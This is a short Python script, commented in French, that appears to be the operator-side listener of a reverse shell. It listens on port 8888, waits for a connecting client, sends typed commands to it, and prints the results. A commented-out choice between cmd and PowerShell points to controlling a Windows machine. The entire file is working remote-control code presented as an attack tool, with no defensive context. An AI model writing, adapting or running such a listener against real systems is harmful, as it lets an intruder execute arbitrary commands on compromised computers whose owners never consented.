#!/usr/bin/env python3

import socket
import time
from os import system, name

def clearScreen():   
    # for windows os
    if name == 'nt': 
        _ = system('cls') 
    # for mac and linux os(The name is posix)
    else: 
        _ = system('clear')

host, port = ("", 8888)
SHOULD_RETRY = True
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # IPV4 = AF_INET || IPV6 = AF_INET6
s.bind((host, port))
s.listen(1) # nombe d'echec
(client, (ip, port)) = s.accept()
print("[+] Client Conectée Bien Jouée ({}:{})".format(ip, port))
#typeofcmd = input("[1] : cmd \n[2] : PowerShell")
while True:
    command = input(">> ")
    if "clear" in command:
        clearScreen()
        continue
    if "terminate" in command:
        print("terminating")
        command = command.encode()
        client.sendall(command)
        time.sleep(2)
        break
    else :
        if command == "":
            continue
        command = command.encode()
        client.sendall(command) # b pour Convertoin de la chaine de character en byte
        result = client.recv(1024) # 1024 pour ta taille en byte du msg
        result = result.decode('utf-8', 'ignore')
        print(result)

client.close()
s.close()
